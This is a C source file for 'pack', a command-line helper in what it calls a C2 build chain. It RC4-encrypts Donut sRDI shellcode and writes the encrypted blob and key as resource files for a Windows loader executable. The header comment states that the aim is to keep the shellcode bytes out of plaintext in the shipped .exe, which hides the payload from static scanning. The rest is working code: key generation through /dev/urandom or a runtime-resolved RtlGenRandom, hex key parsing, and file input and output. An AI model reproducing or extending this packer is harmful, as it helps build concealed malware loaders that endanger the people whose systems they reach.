/*
 * pack - C2-side helper that RC4-encrypts a shellcode blob for embedding.
 *
 * The generated loader decrypts at runtime, so "encryption" here means
 * obfuscation at rest; the point is that the shellcode bytes never appear in
 * plaintext in the shipped .exe or its resource section.
 *
 * Usage:
 *   pack <in.bin> <payload.bin> <key.bin> [key-hex]
 *
 *   in.bin     Donut sRDI shellcode to embed
 *   payload.bin  output: RC4-encrypted blob (becomes RCDATA IDR_PAYLOAD)
 *   key.bin      output: raw RC4 key bytes (becomes RCDATA IDR_KEY)
 *   key-hex    optional 1..256-byte key as hex; a fresh random 16-byte key
 *              is generated when omitted
 *
 * Compiled with the host C compiler by build.sh, so it runs natively on the
 * C2 (Linux) or on Windows (msys2). The random key source is /dev/urandom on
 * POSIX and RtlGenRandom (SystemFunction036, advapi32) on Windows.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "rc4.h"

#ifdef _WIN32
#include <windows.h>

/* RtlGenRandom is not declared in the mingw headers; resolve it at runtime
 * so the helper needs no extra import library. */
typedef BOOLEAN(WINAPI *rtl_gen_random_fn)(PVOID, ULONG);

static int random_bytes(unsigned char *buf, size_t len) {
  static rtl_gen_random_fn fn = NULL;
  size_t off = 0;

  if (fn == NULL) {
    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (advapi == NULL) {
      return -1;
    }
    fn = (rtl_gen_random_fn)(void *)GetProcAddress(advapi, "SystemFunction036");
    if (fn == NULL) {
      return -1;
    }
  }
  while (off < len) {
    ULONG chunk = (ULONG)((len - off) > 0x4000 ? 0x4000 : (len - off));
    if (!fn(buf + off, chunk)) {
      return -1;
    }
    off += chunk;
  }
  return 0;
}
#else /* POSIX */
#include <fcntl.h>
#include <unistd.h>

static int random_bytes(unsigned char *buf, size_t len) {
  int fd = open("/dev/urandom", O_RDONLY);
  size_t off = 0;

  if (fd < 0) {
    return -1;
  }
  while (off < len) {
    ssize_t n = read(fd, buf + off, len - off);
    if (n <= 0) {
      close(fd);
      return -1;
    }
    off += (size_t)n;
  }
  close(fd);
  return 0;
}
#endif

static int hex_val(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

/* hex_decode decodes hex into key; returns decoded length or -1. */
static int hex_decode(const char *hex, unsigned char *key, size_t key_cap) {
  size_t n = strlen(hex);
  size_t i;

  if (n == 0 || n % 2 != 0 || n / 2 > key_cap) {
    return -1;
  }
  for (i = 0; i < n / 2; i++) {
    int hi = hex_val(hex[i * 2]);
    int lo = hex_val(hex[i * 2 + 1]);
    if (hi < 0 || lo < 0) {
      return -1;
    }
    key[i] = (unsigned char)((hi << 4) | lo);
  }
  return (int)(n / 2);
}

static void usage(const char *prog) {
  fprintf(stderr,
          "usage: %s <in.bin> <payload.bin> <key.bin> [key-hex]\n"
          "  RC4-encrypt <in.bin> into <payload.bin>; write the RC4 key\n"
          "  (from [key-hex], or a random 16-byte key) to <key.bin>\n",
          prog);
}

static int read_file(const char *path, unsigned char **buf, size_t *len) {
  FILE *f = fopen(path, "rb");
  long size;

  if (f == NULL) {
    fprintf(stderr, "pack: cannot open %s\n", path);
    return -1;
  }
  if (fseek(f, 0, SEEK_END) != 0 || (size = ftell(f)) < 0 ||
      fseek(f, 0, SEEK_SET) != 0) {
    fprintf(stderr, "pack: cannot size %s\n", path);
    fclose(f);
    return -1;
  }
  *buf = malloc((size_t)size ? (size_t)size : 1);
  if (*buf == NULL) {
    fprintf(stderr, "pack: out of memory\n");
    fclose(f);
    return -1;
  }
  if (size > 0 && fread(*buf, 1, (size_t)size, f) != (size_t)size) {
    fprintf(stderr, "pack: short read on %s\n", path);
    free(*buf);
    *buf = NULL;
    fclose(f);
    return -1;
  }
  fclose(f);
  *len = (size_t)size;
  return 0;
}

static int write_file(const char *path, const unsigned char *buf, size_t len) {
  FILE *f = fopen(path, "wb");

  if (f == NULL) {
    fprintf(stderr, "pack: cannot write %s\n", path);
    return -1;
  }
  if (len > 0 && fwrite(buf, 1, len, f) != len) {
    fprintf(stderr, "pack: short write on %s\n", path);
    fclose(f);
    return -1;
  }
  fclose(f);
  return 0;
}

int main(int argc, char **argv) {
  unsigned char *plain = NULL;
  unsigned char *key = NULL;
  size_t plain_len = 0;
  int key_len = 0;
  rc4_ctx ctx;

  if (argc != 4 && argc != 5) {
    usage(argv[0]);
    return 2;
  }

  if (read_file(argv[1], &plain, &plain_len) != 0) {
    return 1;
  }
  if (plain_len == 0) {
    fprintf(stderr, "pack: input %s is empty\n", argv[1]);
    free(plain);
    return 1;
  }

  key = malloc(256);
  if (key == NULL) {
    fprintf(stderr, "pack: out of memory\n");
    free(plain);
    return 1;
  }
  if (argc == 5 && argv[4][0] != '\0') {
    key_len = hex_decode(argv[4], key, 256);
    if (key_len <= 0) {
      fprintf(stderr, "pack: invalid key hex (need 1..256 bytes, even-length "
                      "hex digits)\n");
      free(plain);
      free(key);
      return 1;
    }
  } else {
    if (random_bytes(key, 16) != 0) {
      fprintf(stderr, "pack: cannot generate a random key\n");
      free(plain);
      free(key);
      return 1;
    }
    key_len = 16;
  }

  rc4_init(&ctx, key, (size_t)key_len);
  rc4_crypt(&ctx, plain, plain_len);

  if (write_file(argv[2], plain, plain_len) != 0 ||
      write_file(argv[3], key, (size_t)key_len) != 0) {
    free(plain);
    free(key);
    return 1;
  }

  fprintf(stderr, "pack: %zu bytes encrypted with a %d-byte RC4 key\n",
          plain_len, key_len);
  free(plain);
  free(key);
  return 0;
}
